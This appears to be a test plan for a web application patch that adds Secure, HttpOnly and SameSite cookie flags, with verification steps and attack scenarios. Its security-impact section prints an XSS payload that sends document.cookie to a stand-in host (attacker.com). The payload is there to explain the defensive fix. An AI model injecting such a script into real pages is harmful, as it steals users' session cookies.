# Test Plan: Secure Cookie Flags (PATCH 55)

## What Was Fixed

**Vulnerability:** Cookies without Secure flag and HttpOnly flag (CWE-1004, CWE-614)
**CVSS Score:** 3.1 (Low)

**Before PATCH 55:**
- ❌ Cookies transmitted over HTTP (insecure)
- ❌ Cookies accessible via JavaScript (XSS vulnerability)
- ❌ NODE_ENV=development (secure flag disabled)
- ❌ Frontend cookies missing secure/sameSite flags

**After PATCH 55:**
- ✅ Cookies only transmitted over HTTPS (Secure flag)
- ✅ Cookies not accessible via JavaScript (HttpOnly flag)
- ✅ NODE_ENV=production (secure cookies enabled)
- ✅ Frontend cookies have secure/sameSite flags
- ✅ CSRF protection (SameSite=strict)

## Changes Made

### Backend Changes

**File 1: `/Backend/.env` (Lines 5-8)**
```bash
# BEFORE
NODE_ENV=development

# AFTER  
# PATCH 55: Changed to production to enable secure cookies (CWE-1004, CWE-614)
# UAT environment should use production settings for security
NODE_ENV=production
```

**File 2: `/Backend/controllers/auth.controller.js`**

**Location 1: verify2FA function (Lines 50-56)**
```javascript
// BEFORE
res.cookie('refreshToken', refresh_token, {
  httpOnly: true,
  secure: process.env.NODE_ENV === 'production',  // Was false in development
  sameSite: 'strict',
  maxAge: 7 * 24 * 60 * 60 * 1000
});

// AFTER
// PATCH 55: Secure cookie settings (CWE-1004, CWE-614)
res.cookie('refreshToken', refresh_token, {
  httpOnly: true,  // Prevent JavaScript access (XSS protection)
  secure: true,    // Only transmit over HTTPS (was conditional)
  sameSite: 'strict',  // CSRF protection
  maxAge: 7 * 24 * 60 * 60 * 1000  // 7 days
});
```

**Location 2: refreshToken function (Lines 81-87)**
```javascript
// Same changes as above
```

### Frontend Changes

**File 3: `/Frontend/src/lib/auth.ts` (Lines 35-47)**
```typescript
// BEFORE
Cookies.set('auth_token', token, { expires: 1 })
Cookies.set('user_info', JSON.stringify(user), { expires: 1 })

// AFTER
// PATCH 55: Set cookies with secure flags (CWE-1004, CWE-614)
// Note: httpOnly cannot be set from JavaScript (browser limitation)
// httpOnly cookies must be set by the backend server
Cookies.set('auth_token', token, {
  expires: 1,        // 1 day
  secure: true,      // Only transmit over HTTPS
  sameSite: 'strict' // CSRF protection
})
Cookies.set('user_info', JSON.stringify(user), {
  expires: 1,        // 1 day
  secure: true,      // Only transmit over HTTPS
  sameSite: 'strict' // CSRF protection
})
```

## Testing Instructions

### Method 1: Browser Developer Tools (Recommended)

**Steps:**

1. **Clear existing cookies:**
   - Open browser
   - Press F12 to open Developer Tools
   - Go to Application tab (Chrome) or Storage tab (Firefox)
   - Click "Cookies" in left sidebar
   - Select https://uat.cyberpull.space
   - Delete all cookies (right-click > Clear)

2. **Login to application:**
   - Go to https://uat.cyberpull.space/login
   - Enter your credentials
   - Click Login

3. **Inspect cookies:**
   - Open Developer Tools (F12)
   - Go to Application tab > Cookies > https://uat.cyberpull.space
   - Look for cookies: `auth_token`, `user_info`, `refreshToken`

4. **Verify cookie flags:**

**Expected Results:**

| Cookie Name | Secure | HttpOnly | SameSite | Path | Domain |
|-------------|--------|----------|----------|------|--------|
| `auth_token` | ✅ Yes | ❌ No* | Strict | / | uat.cyberpull.space |
| `user_info` | ✅ Yes | ❌ No* | Strict | / | uat.cyberpull.space |
| `refreshToken` | ✅ Yes | ✅ Yes | Strict | / | uat.cyberpull.space |

*Note: JavaScript-set cookies (auth_token, user_info) cannot have HttpOnly flag due to browser security. Only server-set cookies (refreshToken) can have HttpOnly.

**Screenshot Location:**
- Chrome: DevTools > Application > Cookies
- Firefox: DevTools > Storage > Cookies

### Method 2: Browser Console Test

**Test 1: Verify Secure flag prevents HTTP transmission**

```javascript
// In browser console
document.cookie
// Should show cookies
// Try to access over HTTP (won't work with secure flag)
```

**Test 2: Verify HttpOnly flag (for refreshToken)**

```javascript
// In browser console
// Try to access refreshToken cookie
document.cookie
// Should NOT show refreshToken (it's HttpOnly)
// Should show auth_token and user_info (not HttpOnly)
```

**Test 3: Verify SameSite protection**

```javascript
// Cookies with SameSite=strict won't be sent on cross-site requests
// This protects against CSRF attacks
```

### Method 3: Network Tab Inspection

**Steps:**

1. Open Developer Tools (F12)
2. Go to Network tab
3. Click any API request (e.g., GET /api/organisations)
4. Click "Cookies" tab in request details
5. Verify cookies have Secure flag

**Expected:**
- All cookies sent only over HTTPS
- Cookies NOT sent if connection downgrades to HTTP

### Method 4: Automated Test Script

```bash
# Test cookie headers
curl -v https://uat.cyberpull.space/api/auth/me \
  -H "Authorization: Bearer YOUR_TOKEN" \
  2>&1 | grep -i "set-cookie"

# Expected output should show:
# Set-Cookie: refreshToken=...; Path=/; Secure; HttpOnly; SameSite=Strict
```

## Verification Checklist

✅ **Backend Cookies (refreshToken):**
- [ ] Secure flag = Yes
- [ ] HttpOnly flag = Yes
- [ ] SameSite = Strict
- [ ] Domain = uat.cyberpull.space
- [ ] Path = /

✅ **Frontend Cookies (auth_token, user_info):**
- [ ] Secure flag = Yes
- [ ] HttpOnly flag = No (expected - JavaScript limitation)
- [ ] SameSite = Strict
- [ ] Domain = uat.cyberpull.space
- [ ] Path = /

✅ **Environment:**
- [ ] NODE_ENV = production
- [ ] Backend restarted with --update-env
- [ ] Frontend rebuilt and restarted

✅ **Security Tests:**
- [ ] Cookies NOT accessible via document.cookie (HttpOnly ones)
- [ ] Cookies only sent over HTTPS
- [ ] Cookies NOT sent on cross-site requests (SameSite=strict)

## Security Impact

### Attack Scenarios Prevented

**Scenario 1: XSS Attack (HttpOnly Protection)**

**Before:**
```javascript
// Attacker injects malicious script
<script>
  fetch('https://attacker.com/steal?cookie=' + document.cookie)
</script>
// Result: Attacker steals ALL cookies including session tokens
```

**After:**
```javascript
// Attacker injects same script
<script>
  fetch('https://attacker.com/steal?cookie=' + document.cookie)
</script>
// Result: Only non-HttpOnly cookies stolen (auth_token, user_info)
// refreshToken (the sensitive session token) is NOT stolen
// Attacker cannot hijack session
```

**Scenario 2: Man-in-the-Middle (Secure Flag Protection)**

**Before:**
```
User connects to http://uat.cyberpull.space (HTTP, no encryption)
→ Browser sends cookies over HTTP
→ Attacker intercepts HTTP traffic
→ Attacker steals cookies in plain text
→ Attacker can hijack session
```

**After:**
```
User connects to http://uat.cyberpull.space (HTTP)
→ Browser DOES NOT send cookies (Secure flag)
→ User redirected to HTTPS
→ Cookies only sent over HTTPS (encrypted)
→ Attacker cannot intercept
```

**Scenario 3: CSRF Attack (SameSite Protection)**

**Before:**
```
Attacker creates malicious site: evil.com
User visits evil.com while logged into uat.cyberpull.space
evil.com triggers request to uat.cyberpull.space/api/users/delete
→ Browser sends cookies with request
→ Request authenticated and executed
→ User's data deleted
```

**After:**
```
Attacker creates malicious site: evil.com
User visits evil.com while logged into uat.cyberpull.space
evil.com triggers request to uat.cyberpull.space/api/users/delete
→ Browser DOES NOT send cookies (SameSite=strict)
→ Request not authenticated
→ Request rejected (401 Unauthorized)
```

## Common Issues & Solutions

### Issue 1: Cookies not being set

**Symptom:** No cookies appear after login

**Cause:** Browser may block secure cookies on localhost

**Solution:** 
- Use HTTPS domain (uat.cyberpull.space) ✅
- Don't test on localhost or HTTP

### Issue 2: "Secure" flag not showing

**Symptom:** Secure flag appears as "No" in DevTools

**Possible Causes:**
1. Page loaded over HTTP (not HTTPS)
2. Backend NODE_ENV not set to production
3. Backend not restarted

**Solution:**
```bash
# Check NODE_ENV
pm2 show uat-soc-backend | grep NODE_ENV

# Restart with --update-env
pm2 restart uat-soc-backend --update-env

# Verify in browser: must use HTTPS
https://uat.cyberpull.space (not http://)
```

### Issue 3: Cannot access cookies via JavaScript

**Symptom:** `document.cookie` returns empty or partial list

**Cause:** HttpOnly cookies are HIDDEN from JavaScript (this is correct behavior)

**Solution:** This is working as intended. HttpOnly cookies:
- ✅ Visible in DevTools > Application > Cookies
- ❌ NOT visible in `document.cookie`
- ✅ Automatically sent with HTTP requests

## Browser Compatibility

| Browser | Secure Flag | HttpOnly Flag | SameSite=Strict | Status |
|---------|-------------|---------------|-----------------|--------|
| Chrome 94+ | ✅ Yes | ✅ Yes | ✅ Yes | ✅ Full Support |
| Firefox 91+ | ✅ Yes | ✅ Yes | ✅ Yes | ✅ Full Support |
| Safari 15+ | ✅ Yes | ✅ Yes | ✅ Yes | ✅ Full Support |
| Edge 94+ | ✅ Yes | ✅ Yes | ✅ Yes | ✅ Full Support |

## Success Criteria

✅ All cookies have Secure flag = Yes
✅ Backend cookies (refreshToken) have HttpOnly = Yes
✅ All cookies have SameSite = Strict
✅ Cookies only transmitted over HTTPS
✅ HttpOnly cookies not accessible via document.cookie
✅ CSRF protection working (SameSite=strict)
✅ XSS protection working (HttpOnly)
✅ NODE_ENV = production in backend

---

## Quick Test Commands

```bash
# 1. Check NODE_ENV
pm2 show uat-soc-backend | grep NODE_ENV
# Expected: NODE_ENV: 'production'

# 2. Test cookie headers in API response
curl -v https://uat.cyberpull.space/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"identifier":"user@example.com","password":"password","recaptchaToken":"token"}' \
  2>&1 | grep -i "set-cookie"
# Expected: Secure; HttpOnly; SameSite=Strict

# 3. Verify services running
pm2 list | grep uat-soc
# Expected: Both backend and frontend online
```

